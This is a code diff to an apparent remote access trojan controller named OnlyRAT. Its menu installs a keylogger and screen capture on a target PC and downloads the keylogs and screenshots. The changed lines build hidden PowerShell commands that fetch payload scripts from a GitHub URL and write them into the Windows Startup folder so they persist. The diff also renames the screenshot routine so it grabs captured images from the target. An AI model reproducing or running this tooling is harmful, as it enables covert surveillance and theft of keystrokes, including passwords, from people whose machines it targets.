@@ -40,7 +40,7 @@ options_menu = """
             [1] - Install Keylogger
             [2] - Grab Keylogs
             [3] - Install ScreenCapture
-            [4] - Take ScreenShot
+            [4] - Grab ScreenShots 
             [5] - Restart Target PC
 
         [+] Options:
@@ -152,7 +152,7 @@ def keylogger(address, password, username, working):
     print("\n[*] Prepping keylogger...")
     # web requests
     keylogger_command = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/keylogger.ps1 -OutFile {working}/KHRgMHYmdT.ps1\""
-    controller_command = f"cd C:/Users/{username}/AppData/Roaming/Microsoft/Windows && cd \"Start Menu\" && cd Programs/Startup && echo \"powershell Start-Process powershell.exe -windowstyle hidden $env:temp/KHRgMHYmdT.ps1\" >> GiLqXiexKP.cmd"
+    controller_command = f"cd C:/Users/{username}/AppData/Roaming/Microsoft/Windows && cd \"Start Menu\" && cd Programs/Startup && echo powershell Start-Process powershell.exe -windowstyle hidden $env:temp/KHRgMHYmdT.ps1 >> GiLqXiexKP.cmd"
     print("[+] Keylogger prepped")
 
     # installing keylogger
@@ -166,24 +166,12 @@ def keylogger(address, password, username, working):
     print("\n[!] Restart target computer to execute")
 
 # takes screenshot
-def take_screenshot(address, password, working):
-    # take screenshot
-    print("\n[*] Taking screenshot...")
-    screenshot = f"{working}/SbQRViPjIq.ps1"
-    remote_command(address, password, screenshot)
-    print("[+] Screenshot taken")
-
+def grab_screenshots(address, password, working):
     # download screenshot
-    print("[*] Downloading screenshot...")
-    screenshot_location = f"{working}/cqTbMpzNLx.jpg"
+    print("[*] Downloading screenshots...")
+    screenshot_location = f"{working}/amETlOMhPo"
     remote_download(address, password, screenshot_location)
     print("[+] Screenshot downloaded")
-
-    # rename screenshot to appropiate title
-    print("[*] Formatting screenshot...")
-    file_name = current_date()
-    os.system(f"mv ~/Downloads/cqTbMpzNLx.jpg ~/Downloads/{file_name}")
-    print("[+] Screenshot fromatted")
 
     print("\n[+] Screenshot downloaded to \"~/Downloads\"\n")
 
@@ -294,16 +282,18 @@ def cli(arguments):
             elif option == "3":
                 print("\n[*] Installing screen capture...")
                 install_screencaputre = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/screenshot.ps1 -OutFile {working_direcory}/SbQRViPjIq.ps1\""
-                add_to_startup = f"cd C:/Users/{username}/AppData/Roaming/Microsoft/Windows && cd \"Start Menu\" && cd Programs/Startup && echo \"powershell Start-Process powershell.exe -windowstyle hidden $env:temp/SbQRViPjIq.ps1\" >> GiLqXiexKP.cmd"
+                add_to_startup = f"cd C:/Users/{target_username}/AppData/Roaming/Microsoft/Windows && cd \"Start Menu\" && cd Programs/Startup && echo powershell Start-Process powershell.exe -windowstyle hidden $env:temp/SbQRViPjIq.ps1 >> GiLqXiexKP.cmd"
 
                 remote_command(ipv4, password, install_screencaputre)
                 remote_command(ipv4, password, add_to_startup)
 
                 print("[+] ScreenCapture installed\n")
 
+                print("\n[!] Restart target computer to execute\n")
+
             # take screenshot option
             elif option == "4":
-                take_screenshot(ipv4, password, working_direcory)
+                grab_screenshots(ipv4, password, working_direcory)
 
             # restart target option
             elif option == "5":
